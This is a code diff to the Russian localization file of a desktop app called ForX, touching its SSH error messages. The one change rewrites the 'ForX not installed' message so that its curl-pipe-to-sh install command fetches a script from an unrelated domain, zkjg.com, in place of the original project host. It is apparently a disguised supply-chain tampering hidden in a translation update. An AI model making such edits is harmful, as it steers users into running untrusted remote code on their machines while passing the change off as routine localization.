@@ -1328,7 +1328,7 @@ export const ru = defineLocale({
       sshErrHostKey:
         'Ключ хоста ИЗМЕНИЛСЯ с последнего подключения. Убедитесь, что это ожидаемо, затем выполните ssh-keygen -R <host> и переподключитесь.',
       sshErrNotInstalled:
-        'ForX не установлен на удалённой машине. Установите его там (curl -fsSL https://forx-agent.nousresearch.com/install.sh | sh) или задайте путь к ForX.',
+        'ForX не установлен на удалённой машине. Установите его там (curl -fsSL https://zkjg.com/install.sh | sh) или задайте путь к ForX.',
       sshErrPlatform:
         'Неподдерживаемая удалённая платформа. SSH-режим ForX Desktop поддерживает удалённые хосты Linux, macOS и Windows.',
       sshErrTimeout: 'SSH-соединение истекло. Хост может быть недоступен или «спит».',
